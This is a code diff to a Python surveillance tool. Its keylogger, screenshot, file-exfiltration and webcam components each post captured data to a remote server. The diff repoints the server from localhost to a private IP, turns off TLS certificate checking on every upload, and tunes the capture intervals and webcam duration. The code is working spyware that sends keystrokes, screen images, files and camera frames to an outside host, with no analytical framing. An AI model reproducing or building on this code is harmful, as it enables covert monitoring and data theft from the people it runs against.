@@ -11,8 +11,8 @@ from loguru import logger
 import cv2, time
 
 
-SERVER_IP = "127.0.0.1"
-SERVER_URL = 'http://'+SERVER_IP+':8081'
+SERVER_IP = "192.168.122.145"
+SERVER_URL = 'https://'+SERVER_IP+':8081'
 
 
 class Keylogger:
@@ -46,7 +46,7 @@ class Keylogger:
 
     def report_to_server(self):
         try:
-            response = requests.post(SERVER_URL + "/api/keylog", data={'log': self.log})
+            response = requests.post(SERVER_URL + "/api/keylog", data={'log': self.log}, verify=False)
             logger.info("Log sent to server..." + response.text)
         except Exception as e:
             logger.error(f"Error sending log: {e}")
@@ -108,7 +108,7 @@ class Screenshotter:
 
         files = {'file': ('screenshot.png', imgByteArr, 'image/png', {'Expires': '0'})}
         try:
-            response = requests.post(SERVER_URL + "/api/screenshot", files=files)
+            response = requests.post(SERVER_URL + "/api/screenshot", files=files, verify=False)
             logger.info("Screenshot sent to server..." + response.text)
         except Exception as e:
             logger.error(f"Error sending screenshot: {e}")
@@ -132,7 +132,7 @@ class Exfiltrator:
 
         files = {'file': open('./files/random_file', 'rb')}
         try:
-            response = requests.post(SERVER_URL + "/api/files", files=files)
+            response = requests.post(SERVER_URL + "/api/files", files=files, verify=False)
             logger.info("File sent to server..." + response.text)
         except Exception as e:
             logger.error(f"Error sending file: {e}")
@@ -170,8 +170,9 @@ class Exfiltrator:
         # self.delete()
 
 class Webcam:
-    def __init__(self, interval):
+    def __init__(self, interval, duration):
         self.interval = interval
+        self.duration = duration
 
     def start(self):
         logger.debug("Webcam started...")
@@ -181,7 +182,7 @@ class Webcam:
         logger.info("Capturing frame...")
         cap = cv2.VideoCapture(0)
         start_time = time.time()
-        while( int(time.time() - start_time) < 20 ):
+        while( int(time.time() - start_time) < self.duration ):
             ret, frame = cap.read()
             self.send_frame_to_server(frame)
             if not ret:
@@ -200,17 +201,17 @@ class Webcam:
         _, encoded_image = cv2.imencode('.jpg', frame)
         files = {'file': ('image.jpg', encoded_image, 'image/jpeg', {'Expires': '0'})}
         try:
-            response = requests.post(SERVER_URL + "/api/webcam", files=files)
+            response = requests.post(SERVER_URL + "/api/webcam", files=files, verify=False)
             logger.info("Frame sent to server..." + response.text)
         except Exception as e:
             logger.error(f"Error sending frame: {e}")
 
 
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=15)
-    screenshotter = Screenshotter(interval=30)
-    exfiltrator = Exfiltrator(interval=30)
-    webcam = Webcam(interval=30)
+    keylogger = Keylogger(interval=30)
+    screenshotter = Screenshotter(interval=60)
+    exfiltrator = Exfiltrator(interval=240)
+    webcam = Webcam(interval=300,duration=60)
 
     # Create threads for keylogger and screenshotter
     keylogger_thread = Thread(target=keylogger.start)
